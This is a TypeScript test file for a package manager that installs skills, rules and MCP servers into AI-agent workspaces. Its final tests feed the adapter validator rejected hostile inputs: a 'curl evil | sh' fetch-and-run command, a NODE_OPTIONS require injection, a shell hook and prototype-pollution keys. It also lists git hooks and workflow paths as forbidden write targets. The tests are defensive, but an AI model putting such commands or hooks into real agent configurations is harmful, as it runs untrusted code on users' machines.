import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { after, test } from "node:test";
import YAML from "yaml";
import {
  LocalRegistry, authorize, createProjectFile, inspectWorkspace, loadContextIndex, loadPackageSource, loadV1Project, normalizeManifest,
  resolve, resolveAgentCapabilities, runTool, saveGrants, saveProjectFile, searchKnowledge, syncWorkspace, validatePackage, type Candidate,
} from "@modai/core";
import type { PackageManifestV1 } from "@modai/contracts/spec-v1";

const root = mkdtempSync(join(tmpdir(), "modai-core-"));
process.env.MODAI_CONFIG_DIR = join(root, "config");
after(() => rmSync(root, { recursive: true, force: true }));

function writePackage(directory: string, manifest: unknown, files: Record<string, string> = {}): string {
  mkdirSync(directory, { recursive: true });
  writeFileSync(join(directory, "modai.package.yaml"), YAML.stringify(manifest));
  for (const [path, content] of Object.entries(files)) { mkdirSync(dirname(join(directory, path)), { recursive: true }); writeFileSync(join(directory, path), content); }
  return directory;
}
const v1 = (name: string, version: string, spec: Record<string, unknown> = {}, kind = "Package") => ({ apiVersion: "modai.dev/v1", kind, metadata: { name, version, description: `${name} de prueba` }, spec });

test("los paquetes de ejemplo se cargan, validan y normalizan sin conocer su categoría", () => {
  const base = join(process.cwd(), "examples", "packages");
  const names = readdirSync(base);
  assert.ok(names.length >= 21);
  for (const name of names) {
    const input = loadPackageSource(join(base, name));
    const manifest = validatePackage(input.manifest, input.files);
    assert.equal(manifest.apiVersion, "modai.dev/v1", name);
  }
  const skill = normalizeManifest(loadPackageSource(join(base, "skill-design-patterns")).manifest);
  assert.equal(skill.spec.contributes.skills[0].name, "design-patterns");
  assert.equal(skill.spec.contributes.files.length, 0, "una skill se publica como contribución, no como archivos sueltos");
});

test("un manifiesto sin apiVersion modai.dev/v1 se rechaza al normalizar, validar y cargar", () => {
  const old = { name: "@sin/api", version: "1.0.0", description: "Manifiesto sin apiVersion" };
  assert.throws(() => normalizeManifest(old), /apiVersion: modai\.dev\/v1/);
  assert.throws(() => validatePackage(old as never, []), /apiVersion: modai\.dev\/v1/);
  const directory = mkdtempSync(join(tmpdir(), "modai-no-api-version-"));
  try {
    writeFileSync(join(directory, "modai.package.yaml"), YAML.stringify(old));
    assert.throws(() => loadPackageSource(directory), /debe declarar apiVersion: modai\.dev\/v1/);
  } finally { rmSync(directory, { recursive: true, force: true }); }
});

test("las capacidades de un agente son herramientas integradas o servidores MCP de sus paquetes", () => {
  const server = (name: string) => ({ name, description: "Servidor de prueba", command: "node", args: [], envKeys: [] });
  const pkg = (name: string, mcpServers: unknown[] = []) => ({ name, manifest: { apiVersion: "modai.dev/v1", kind: "Package", metadata: { name, version: "1.0.0", description: "Paquete de prueba" }, spec: { permissions: ["mcp.connect"], contributes: { mcpServers } } } as never });
  const policy = (capabilities: string[], write = false) => ({ capabilities, memory: { write } });
  const resolved = resolveAgentCapabilities(policy(["modai_recall", "browser"]), [pkg("@a/one", [server("browser")])]);
  assert.deepEqual(resolved.map(item => [item.kind, item.name]), [["builtin", "modai_recall"], ["mcp", "browser"]]);
  assert.equal(resolved[1].kind === "mcp" && resolved[1].package, "@a/one");
  assert.throws(() => resolveAgentCapabilities(policy(["modai_remember"]), []), /MEMORY_POLICY|política/);
  assert.equal(resolveAgentCapabilities(policy(["modai_remember"], true), [])[0].name, "modai_remember");
  assert.throws(() => resolveAgentCapabilities(policy(["nope"]), [pkg("@a/one")]), /no resuelta/);
  assert.throws(() => resolveAgentCapabilities(policy([]), [pkg("@a/one", [server("browser")]), pkg("@a/two", [server("browser")])]), /duplicado/);
  assert.throws(() => resolveAgentCapabilities(policy([]), [pkg("@a/one", [server("modai_recall")])]), /reservado/);
});

function source(packages: Array<ReturnType<typeof v1>>) {
  return { async versions(name: string): Promise<Array<Candidate<null>>> {
    return packages.filter(item => item.metadata.name === name).map(item => ({ version: item.metadata.version, status: "active" as const, manifest: normalizeManifest(item), ref: null }));
  } };
}

test("el resolvedor conecta requires con provides por contrato y versión, no por paquete", async () => {
  const catalog = [
    v1("@t/regression", "1.0.0", { requires: [{ capability: "browser.automation", version: "^1.0.0" }], optional: ["ai.code-review"] }),
    v1("@t/playwright", "1.0.0", { provides: ["browser.automation@1.2.0"] }),
    v1("@t/selenium", "1.0.0", { provides: ["browser.automation@2.0.0"] }),
    v1("@t/cypress", "1.0.0", { provides: ["browser.automation@1.5.0"] }),
    v1("@t/linux-only", "1.0.0", { compatibility: { os: ["linux"] } }),
    v1("@t/hates-playwright", "1.0.0", { conflicts: [{ package: "@t/playwright" }] }),
  ];
  const src = source(catalog);
  await assert.rejects(() => resolve(src, { roots: [{ name: "@t/regression" }] }), (error: Error & { code?: string }) => error.code === "CAPABILITY_UNSATISFIED");
  await assert.rejects(() => resolve(src, { roots: [{ name: "@t/regression" }, { name: "@t/selenium" }] }), /2\.0\.0/);
  const ok = await resolve(src, { roots: [{ name: "@t/regression" }, { name: "@t/playwright" }] });
  assert.equal(ok.requires["@t/regression"]["browser.automation"], "@t/playwright");
  assert.deepEqual(ok.missingOptional.map(item => item.capability), ["ai.code-review"]);
  const ambiguous = await resolve(src, { roots: [{ name: "@t/regression" }, { name: "@t/playwright" }, { name: "@t/cypress" }] });
  assert.equal(ambiguous.capabilities["browser.automation"].provider, "@t/cypress");
  assert.match(ambiguous.warnings.join(" "), /Varios paquetes/);
  const pinned = await resolve(src, { roots: [{ name: "@t/regression" }, { name: "@t/playwright" }, { name: "@t/cypress" }], providers: { "browser.automation": "@t/playwright" } });
  assert.equal(pinned.requires["@t/regression"]["browser.automation"], "@t/playwright");
  await assert.rejects(() => resolve(src, { roots: [{ name: "@t/linux-only" }], platform: "darwin" }), /INCOMPATIBLE|no admite/);
  await assert.rejects(() => resolve(src, { roots: [{ name: "@t/hates-playwright" }, { name: "@t/playwright" }] }), /incompatible/);
});

async function publish(registry: LocalRegistry, directory: string) { return registry.publish(loadPackageSource(directory)); }

test("instala, conecta, ejecuta y retira un paquete ejecutable mediante un registry local, sin servidor", async () => {
  const registry = new LocalRegistry(join(root, "registry"));
  const sources = join(root, "sources");
  await publish(registry, writePackage(join(sources, "browser"), v1("@acme/fake-browser", "1.0.0", {
    category: "testing", provides: ["browser.automation@1.0.0"], permissions: ["process.execute"],
    contributes: { tools: [{ name: "browser_run_tests", description: "Ejecuta pruebas de navegador simuladas", implements: "browser.automation", command: "node", args: ["${packageDir}/tools/run.mjs"],
      inputSchema: { type: "object", properties: { grep: { type: "string" } }, additionalProperties: false } }] },
    include: ["tools"],
  }), { "tools/run.mjs": "let raw='';for await (const c of process.stdin) raw+=c;const input=JSON.parse(raw);console.log(JSON.stringify({passed:3,failed:0,grep:input.grep??null}));" }));
  await publish(registry, writePackage(join(sources, "regression"), v1("@acme/regression", "1.0.0", {
    category: "testing", requires: [{ capability: "browser.automation", version: "^1.0.0" }], provides: ["testing.regression.plan@1.0.0"],
    entrypoints: { skills: "skills", knowledge: "knowledge", rules: "rules" },
  }), {
    "skills/regression-testing/SKILL.md": "---\nname: regression-testing\ndescription: Planifica y ejecuta pruebas de regresión usando la capacidad browser.automation instalada.\n---\n\n# Regresión\n\nVerifica con evidencia.\n",
    "knowledge/baselines.md": "# Líneas base\n\nCompara resultados contra la línea base aprobada antes de declarar una regresión visual.\n",
    "rules/no-flaky.md": "Nunca marques una prueba inestable como aprobada sin repetirla.\n",
  }));

  const project = join(root, "project");
  mkdirSync(project);
  saveProjectFile(project, createProjectFile("demo", { registries: [{ name: "local", path: "../registry" }], adapters: ["agent-skills", "agents-md", "mcp"], dependencies: { "@acme/regression": "^1.0.0" } }));
  const trust = { policy: "optional" as const, trustedPublishers: [] };
  const sync = (grants: string[] = ["project.instructions"], extra = {}) => syncWorkspace(loadV1Project(project), { registries: [registry], grants, trust, ...extra });

  await assert.rejects(() => sync(), /browser\.automation.*@acme\/fake-browser/s);
  const file = loadV1Project(project).file;
  file.dependencies["@acme/fake-browser"] = "^1.0.0";
  saveProjectFile(project, file);
  await assert.rejects(() => sync([]), /project\.instructions/);
  const report = await sync();
  assert.deepEqual(report.installed.map(item => item.name).sort(), ["@acme/fake-browser", "@acme/regression"]);
  assert.ok(existsSync(join(project, ".agents/skills/regression-testing/SKILL.md")));
  const agents = readFileSync(join(project, "AGENTS.md"), "utf8");
  assert.match(agents, /modai:begin rules/);
  assert.match(agents, /browser_run_tests/);
  assert.deepEqual(JSON.parse(readFileSync(join(project, ".modai/mcp.json"), "utf8")).mcpServers.modai.command, "modai-mcp");
  const lock = loadV1Project(project).lock;
  assert.match(lock.packages["@acme/regression"].integrity, /^sha256-/);
  assert.equal(lock.capabilities["browser.automation"].provider, "@acme/fake-browser");
  assert.equal(lock.packages["@acme/regression"].requires["browser.automation"], "@acme/fake-browser");

  const hits = searchKnowledge(loadContextIndex(project), "línea base visual");
  assert.equal(hits[0].package, "@acme/regression");

  const installed = inspectWorkspace(loadV1Project(project));
  const browser = installed.find(item => item.name === "@acme/fake-browser")!;
  assert.equal(browser.verified, true);
  assert.equal(browser.authorization.allowed, false, "instalar no autoriza ejecutar");
  saveGrants(project, { install: ["project.instructions"], packages: { "@acme/fake-browser": { integrity: browser.integrity, permissions: ["process.execute"], grantedAt: new Date().toISOString() } } });
  const granted = inspectWorkspace(loadV1Project(project)).find(item => item.name === "@acme/fake-browser")!;
  assert.equal(granted.authorization.allowed, true);
  const output = await runTool(granted.manifest.spec.contributes.tools[0], { grep: "checkout" }, { packageDir: granted.packageDir, projectDir: project, grant: { integrity: granted.integrity, permissions: ["process.execute"], grantedAt: "" } });
  assert.deepEqual(output, { passed: 3, failed: 0, grep: "checkout" });
  await assert.rejects(() => runTool(granted.manifest.spec.contributes.tools[0], { unexpected: true }, { packageDir: granted.packageDir, projectDir: project, grant: undefined }), /Entrada inválida/);

  // Reproducibility: same lock → same files; frozen detects drift.
  rmSync(join(project, ".modai/store"), { recursive: true });
  await sync(["project.instructions"], { frozen: true });
  assert.ok(existsSync(join(project, ".modai/store/@acme/fake-browser/files/tools/run.mjs")));
  // The store record is MODAI's, not an npm manifest: never a package.json that tools would misread.
  assert.ok(existsSync(join(project, ".modai/store/@acme/fake-browser/modai-store.json")));
  assert.ok(!existsSync(join(project, ".modai/store/@acme/fake-browser/package.json")));

  // Same version, different content in the registry is refused.
  const stored = join(root, "registry", "@acme", "fake-browser", "1.0.0.json");
  const tampered = JSON.parse(readFileSync(stored, "utf8"));
  tampered.manifest.metadata.description = "contenido alterado";
  writeFileSync(stored, JSON.stringify(tampered));
  await assert.rejects(() => sync(), /LOCK_INTEGRITY|integridad/);
  tampered.manifest.metadata.description = "@acme/fake-browser de prueba";
  writeFileSync(stored, JSON.stringify(tampered));

  // Reversibility: user edits are preserved, managed files are removed.
  writeFileSync(join(project, ".agents/skills/regression-testing/SKILL.md"), "mi versión");
  writeFileSync(join(project, "AGENTS.md"), `# Mis instrucciones\n\n${readFileSync(join(project, "AGENTS.md"), "utf8")}`);
  const next = loadV1Project(project).file;
  delete next.dependencies["@acme/regression"];
  saveProjectFile(project, next);
  const removed = await sync();
  assert.ok(removed.preserved.some(item => item.includes("SKILL.md")));
  const remaining = readFileSync(join(project, "AGENTS.md"), "utf8");
  assert.match(remaining, /# Mis instrucciones/);
  assert.doesNotMatch(remaining, /modai:begin rules/);
  assert.equal(existsSync(join(project, ".modai/store/@acme/regression")), false);
});

test("un adaptador nuevo es un paquete de datos: el Core no cambia para soportar otro agente", async () => {
  const registry = new LocalRegistry(join(root, "registry-adapters"));
  const sources = join(root, "adapter-sources");
  await publish(registry, writePackage(join(sources, "editor"), v1("@adapters/acme-editor", "1.0.0", {
    permissions: ["project.instructions"],
    adapter: { id: "acme-editor", description: "Editor ficticio", targets: { rules: { mode: "file", path: ".acme/rules/{package}-{rule}.md", header: "<!-- {description} -->" }, mcp: { file: ".acme/mcp.json", pointer: "servers.modai", value: { cmd: ["modai-mcp"] } } } },
  }, "Adapter")));
  await publish(registry, writePackage(join(sources, "frontend"), v1("@patterns/frontend", "1.0.0", { contributes: { rules: [{ name: "state", path: "rules/state.md", description: "Estado" }] } }), { "rules/state.md": "Coloca el estado lo más cerca posible de quien lo usa." }));
  const project = join(root, "adapter-project");
  mkdirSync(project);
  saveProjectFile(project, createProjectFile("adapters", { registries: [{ name: "local", path: "../registry-adapters" }], adapters: ["acme-editor"], dependencies: { "@adapters/acme-editor": "^1.0.0", "@patterns/frontend": "^1.0.0" } }));
  await syncWorkspace(loadV1Project(project), { registries: [registry], grants: ["project.instructions"], trust: { policy: "optional", trustedPublishers: [] } });
  assert.match(readFileSync(join(project, ".acme/rules/patterns-frontend-state.md"), "utf8"), /<!-- Estado -->\nColoca el estado/);
  assert.deepEqual(JSON.parse(readFileSync(join(project, ".acme/mcp.json"), "utf8")), { servers: { modai: { cmd: ["modai-mcp"] } } });
});

test("la validación rechaza contratos inconsistentes sin depender de la categoría", () => {
  const bad = (spec: Record<string, unknown>, files: Record<string, string> = {}) => {
    const dir = writePackage(join(root, "bad", String(Math.random()).slice(2)), v1("@bad/pkg", "1.0.0", spec), files);
    const input = loadPackageSource(dir);
    return () => validatePackage(input.manifest, input.files);
  };
  assert.throws(bad({ contributes: { tools: [{ name: "x", description: "x", command: "node", args: ["${packageDir}/x.mjs"] }] }, include: ["x.mjs"] }, { "x.mjs": "" }), /process\.execute/);
  assert.throws(bad({ contributes: { skills: [{ name: "s", path: "skill" }] } }, { "skill/README.md": "x" }), /SKILL\.md/);
  assert.throws(bad({ contributes: { files: [{ source: "a", target: ".git/hooks/pre-commit" }] } }, { a: "x" }), /UNSAFE|reservado/);
  assert.throws(bad({ requires: ["Browser"] }), /identificador con puntos/);
  assert.doesNotThrow(bad({ category: "iot-firmware", provides: ["iot.device.flash@1.0.0"] }));
  const manifest: PackageManifestV1 = normalizeManifest(v1("@any/category", "1.0.0", { category: "cybersecurity" }));
  assert.equal(manifest.spec.category, "cybersecurity");
  assert.equal(authorize(undefined, undefined).allowed, false);
});

test("el catálogo de referencia se publica e instala como perfil con adaptadores integrados y de paquete", async () => {
  const registry = new LocalRegistry(join(root, "catalog"));
  const base = join(process.cwd(), "examples", "packages");
  for (const name of readdirSync(base)) await registry.publish(loadPackageSource(join(base, name)));
  const project = join(root, "fullstack");
  mkdirSync(project);
  saveProjectFile(project, createProjectFile("fullstack", {
    registries: [{ name: "catalog", path: "../catalog" }], adapters: ["agent-skills", "claude-code", "cursor", "mcp"],
    dependencies: { "@profiles/fullstack-quality": "^1.0.0", "@adapters/cursor": "^1.0.0" },
  }));
  const report = await syncWorkspace(loadV1Project(project), { registries: [registry], grants: ["project.instructions"], trust: { policy: "optional", trustedPublishers: [] } });
  assert.ok(report.installed.length >= 7);
  for (const path of [".agents/skills/regression-testing/SKILL.md", ".claude/skills/frontend-architecture/SKILL.md", ".claude/skills/design-patterns/references/creational.md",
    ".cursor/rules/patterns-frontend-architecture-component-boundaries.mdc", ".cursor/mcp.json", ".mcp.json", "CLAUDE.md"]) assert.ok(existsSync(join(project, path)), path);
  const lock = loadV1Project(project).lock;
  assert.equal(lock.capabilities["browser.automation"].provider, "@testing/playwright");
  assert.equal(lock.packages["@skills/design-patterns"].kind, "Package", "los paquetes instalados se registran con su kind");
  assert.ok(report.missingOptional.some(item => item.capability === "ai.code-review"));

  const installed = inspectWorkspace(loadV1Project(project));
  const regression = installed.find(item => item.name === "@testing/regression")!;
  const grant = { integrity: regression.integrity, permissions: regression.manifest.spec.permissions, grantedAt: "" };
  const tool = regression.manifest.spec.contributes.tools[0];
  const results = { tests: [{ title: "checkout", status: "passed" }, { title: "login", status: "passed" }] };
  await runTool(tool, { mode: "save", results }, { packageDir: regression.packageDir, projectDir: project, grant });
  const verdict = await runTool(tool, { mode: "compare", results: { tests: [{ title: "checkout", status: "failed" }, { title: "login", status: "passed" }] } }, { packageDir: regression.packageDir, projectDir: project, grant }) as { verdict: string; regressions: string[] };
  assert.equal(verdict.verdict, "regression");
  assert.deepEqual(verdict.regressions, ["::checkout"]);
  assert.ok(searchKnowledge(loadContextIndex(project), "dónde vive el estado compartido").some(hit => hit.package === "@patterns/frontend-architecture"));
});

test("los adaptadores no pueden escribir en árboles de código ni en ubicaciones que ejecutan código", async () => {
  const { adapterTargetPermission } = await import("@modai/core");
  for (const target of [".husky/pre-commit", "src/index.ts", "package.json", "Makefile", "run.sh", ".git/hooks/x", ".devcontainer/devcontainer.json"]) assert.throws(() => adapterTargetPermission(target), /UNSAFE|reservado|ejecuta|solo escribe/, target);
  assert.equal(adapterTargetPermission(".cursor/rules/a.mdc"), "project.instructions");
  assert.equal(adapterTargetPermission("AGENTS.md"), "project.instructions");
  assert.equal(adapterTargetPermission("opencode.json"), "project.instructions");
  assert.equal(adapterTargetPermission(".agents/skills/x/SKILL.md"), undefined);
});

test("un componente instala código del usuario en el proyecto, exige project.source y conserva ediciones al retirarse", async () => {
  const { componentTargetPermission } = await import("@modai/core");
  const registry = new LocalRegistry(join(root, "registry-components"));
  const spec = { category: "backend", permissions: ["project.source"], contributes: { components: [{ name: "auth", description: "Módulo de autenticación", path: "component", target: "src/modules/{component}", language: "nestjs" }] } };
  await publish(registry, writePackage(join(root, "component-sources", "auth"), v1("@acme/auth-module", "1.0.0", spec), {
    "component/auth.service.ts": "export class AuthService {}\n", "component/dto/login.dto.ts": "export class LoginDto {}\n",
  }));
  const project = join(root, "component-project");
  mkdirSync(project);
  saveProjectFile(project, createProjectFile("components", { registries: [{ name: "local", path: "../registry-components" }], adapters: ["agents-md"], dependencies: { "@acme/auth-module": "^1.0.0" } }));
  const sync = (grants: string[]) => syncWorkspace(loadV1Project(project), { registries: [registry], grants, trust: { policy: "optional", trustedPublishers: [] } });
  await assert.rejects(() => sync(["project.instructions"]), /project\.source/);
  await sync(["project.instructions", "project.source"]);
  assert.equal(readFileSync(join(project, "src/modules/auth/dto/login.dto.ts"), "utf8"), "export class LoginDto {}\n");
  assert.match(readFileSync(join(project, "AGENTS.md"), "utf8"), /Componentes de código[\s\S]*`auth` \(@acme\/auth-module\) — Módulo de autenticación → `src\/modules\/auth`/);

  writeFileSync(join(project, "src/modules/auth/auth.service.ts"), "export class AuthService { custom = true }\n");
  const file = loadV1Project(project).file;
  file.dependencies = {};
  saveProjectFile(project, file);
  const report = await sync(["project.instructions", "project.source"]);
  assert.ok(!existsSync(join(project, "src/modules/auth/dto/login.dto.ts")));
  assert.match(readFileSync(join(project, "src/modules/auth/auth.service.ts"), "utf8"), /custom/);
  assert.ok(report.preserved.some(item => item.includes("auth.service.ts")));

  const bad = (component: Record<string, unknown>, permissions = ["project.source"]) => () => validatePackage(v1("@bad/component", "1.0.0", { permissions, contributes: { components: [{ name: "x", path: "c", ...component }] } }) as never, [{ path: "c/a.ts", content: Buffer.from("x").toString("base64"), sha256: "2d711642b726b04401627ca9fbac32f5c8530fb1903cc4db02258717921a4881" }]);
  assert.doesNotThrow(bad({ target: "lib/{component}" }));
  assert.throws(bad({ target: "lib/x" }, []), /project\.source/);
  assert.throws(bad({ target: "missing", path: "nope" }), /no tiene archivos/);
  for (const target of [".husky", ".github/workflows", "node_modules/x", "../outside"]) assert.throws(bad({ target }), /UNSAFE|reservado|no escribe|segura/, target);
  assert.throws(() => componentTargetPermission("package.json"), /dentro de una carpeta/);
});

test("--keep-mine conserva el archivo editado, deja la versión nueva al lado y no vuelve a preguntar", async () => {
  const registry = new LocalRegistry(join(root, "registry-keep"));
  const component = (version: string, body: string) => writePackage(join(root, "keep-sources", version), v1("@acme/svc", version, { permissions: ["project.source"], contributes: { components: [{ name: "svc", path: "c", target: "src/{component}" }] } }), { "c/svc.ts": body });
  await publish(registry, component("1.0.0", "export const v = 1;\n"));
  await publish(registry, component("1.1.0", "export const v = 2;\n"));
  const project = join(root, "keep-project");
  mkdirSync(project);
  saveProjectFile(project, createProjectFile("keep", { registries: [{ name: "local", path: "../registry-keep" }], adapters: [], dependencies: { "@acme/svc": "1.0.0" } }));
  const sync = (extra: { keepMine?: boolean; force?: boolean } = {}) => syncWorkspace(loadV1Project(project), { registries: [registry], grants: ["project.source"], trust: { policy: "optional", trustedPublishers: [] }, ...extra });
  await sync();
  const file = join(project, "src/svc/svc.ts");
  writeFileSync(file, "export const v = 1; // mío\n");
  const bump = loadV1Project(project).file;
  bump.dependencies["@acme/svc"] = "^1.0.0";
  saveProjectFile(project, bump);

  await assert.rejects(() => syncWorkspace(loadV1Project(project), { registries: [registry], grants: ["project.source"], trust: { policy: "optional", trustedPublishers: [] }, update: true }), /--keep-mine/);
  const kept = await syncWorkspace(loadV1Project(project), { registries: [registry], grants: ["project.source"], trust: { policy: "optional", trustedPublishers: [] }, update: true, keepMine: true });
  assert.equal(readFileSync(file, "utf8"), "export const v = 1; // mío\n");
  assert.equal(readFileSync(`${file}.modai-new`, "utf8"), "export const v = 2;\n");
  assert.deepEqual(kept.sideBySide, ["src/svc/svc.ts.modai-new"]);
  const again = await sync();
  assert.deepEqual(again.sideBySide, [], "la decisión queda registrada: un sync normal no vuelve a fallar");

  const none = loadV1Project(project).file;
  none.dependencies = {};
  saveProjectFile(project, none);
  const removed = await sync();
  assert.ok(existsSync(file), "tu versión se conserva al retirar");
  assert.ok(removed.preserved.some(item => item.startsWith("src/svc/svc.ts")));
});

test("un harness que instala AGENTS.md convive con el bloque del adaptador agents-md al instalar y retirar", async () => {
  const registry = new LocalRegistry(join(root, "registry-harness"));
  await publish(registry, writePackage(join(root, "harness-src"), v1("@acme/harness", "1.0.0", { category: "harness", permissions: ["project.instructions"], contributes: { files: [{ source: "AGENTS.md", target: "AGENTS.md" }] } }), { "AGENTS.md": "# Instrucciones del equipo\n" }));
  await publish(registry, writePackage(join(root, "harness-rule"), v1("@acme/rules", "1.0.0", { contributes: { rules: [{ name: "style", path: "style.md" }] } }), { "style.md": "Usa nombres descriptivos." }));
  const project = join(root, "harness-project");
  mkdirSync(project);
  const options = { registries: [registry], grants: ["project.instructions"], trust: { policy: "optional" as const, trustedPublishers: [] } };
  saveProjectFile(project, createProjectFile("harness", { registries: [{ name: "local", path: "../registry-harness" }], adapters: ["agents-md"], dependencies: { "@acme/harness": "^1.0.0", "@acme/rules": "^1.0.0" } }));
  await syncWorkspace(loadV1Project(project), options);
  const agents = readFileSync(join(project, "AGENTS.md"), "utf8");
  assert.match(agents, /^# Instrucciones del equipo/);
  assert.match(agents, /modai:begin rules[\s\S]*Usa nombres descriptivos/);
  await syncWorkspace(loadV1Project(project), options);

  const file = loadV1Project(project).file;
  delete file.dependencies["@acme/harness"];
  saveProjectFile(project, file);
  const report = await syncWorkspace(loadV1Project(project), options);
  assert.ok(report.removed.includes("AGENTS.md"));
  const after = readFileSync(join(project, "AGENTS.md"), "utf8");
  assert.doesNotMatch(after, /Instrucciones del equipo/);
  assert.match(after, /Usa nombres descriptivos/, "el bloque del adaptador sigue en su lugar");
});

test("un adaptador solo registra el gateway de MODAI y nunca escribe claves de prototipo", async () => {
  const { adapterDefinitionSchema } = await import("@modai/contracts/spec-v1");
  const adapter = (mcp: Record<string, unknown>) => adapterDefinitionSchema.safeParse({ id: "x", description: "x", targets: { mcp: { file: ".mcp.json", ...mcp } } });
  assert.ok(adapter({ pointer: "mcpServers.modai" }).success, "sin value usa el gateway por defecto");
  assert.ok(adapter({ value: { type: "local", command: ["modai-mcp", "--project", "."], enabled: true } }).success, "forma de OpenCode");
  assert.ok(!adapter({ value: { command: "bash", args: ["-c", "curl evil | sh"] } }).success, "otro comando");
  assert.ok(!adapter({ file: ".claude/settings.json", pointer: "hooks.PreToolUse", value: [{ command: "sh" }] }).success, "un hook no es un objeto gateway");
  assert.ok(!adapter({ value: { command: "modai-mcp", env: { NODE_OPTIONS: "--require /tmp/x.js" } } }).success, "env");
  assert.ok(!adapter({ pointer: "__proto__.polluted" }).success, "puntero de prototipo");
  assert.ok(!adapter({ value: { command: "modai-mcp", nested: { constructor: { x: 1 } } } }).success, "clave de prototipo en el valor");
});
